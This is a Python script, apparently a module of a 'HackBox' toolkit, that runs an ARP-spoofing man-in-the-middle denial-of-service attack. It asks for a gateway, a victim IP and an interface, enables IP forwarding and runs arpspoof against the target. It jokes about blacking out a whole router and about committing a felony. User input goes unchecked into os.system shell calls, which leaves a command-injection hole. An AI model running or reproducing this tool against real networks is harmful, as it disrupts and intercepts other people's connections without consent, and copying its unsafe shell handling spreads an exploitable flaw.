## ArpSpoof V1.1 4/29/22
## improvement + full MITM: https://linuxhint.com/arp_spoofing_using_man_in_the_middle_attack/
import os
print(r"""
  ___                 _____                        __ 
 / _ \               /  ___|                      / _|
/ /_\ \ _ __  _ __   \ `--.  _ __    ___    ___  | |_ 
|  _  || '__|| '_ \   `--. \| '_ \  / _ \  / _ \ |  _|
| | | || |   | |_) | /\__/ /| |_) || (_) || (_) || |  
\_| |_/|_|   | .__/  \____/ | .__/  \___/  \___/ |_|  
             | |            | |                       
             |_|            |_|          

            """)


print("""
a) MITM DOS

---------------\n
h) Help
w) quit to Attack Mode
q) Exit to HackBox\n
--------------- 
x) Attack Mode
y) Defense Mode
z) Recon Mode\n

Enter an option:      """)

statement = input("").lower()
while True:
	if statement == 'a':
		os.system('echo ''')
		print("For this attack to work, you must be on the same network and subnet as your target!")
		os.system('echo ''')
		os.system('echo ----------')
		os.system('route -n')
		os.system('echo ----------')

		print("Enter the network's Default Gateway (listed above)")
		defaultgateway = input("")

		os.system('echo ''')
		os.system('echo Enter Victim IP - or... enter the Router IP for a potential blackout :)')
		victimip = input("")

		os.system('echo ''')
		os.system('echo Enter Your network interface name, ex wlan0, also listed above')

		interfacename = input("")
		os.system('echo ''')

		os.system('echo If you see Mac Addresses flying around, then congrats you have commited a felony... and are now nuking your targets connection')
		os.system('echo ''')
		os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
		os.system('arpspoof -i '+ interfacename + ' -t ' + victimip + ' -r '+ defaultgateway)


# ----------- moving around ---------------------#
	elif statement=="h":
		print("""
ArpSpoof!
MITM DOS: Basically this is a Man In The Middle attack, that doesn't forward traffic past your device, thus loss of internet/services. It uses arpspoof/dnsniff as its backend.
		""")
	elif statement=="w":
		exec(open('Modules/attack/Attack.py').read()) 
	elif statement=="q":
		os.system('clear')
		exec(open('HackBox.py').read())   
		ans = None
# ------------ Mode Switch ----------------------#
	elif statement=="x":
		exec(open('Modules/attack/Attack.py').read()) 
	elif statement=="y":
		exec(open('Modules/defense/Defense.py').read()) 
	elif statement=="z":
		exec(open('Modules/recon/Recon.py').read()) 
	else:
		print("\nOption not found, type help for help")
	statement = input("").lower()

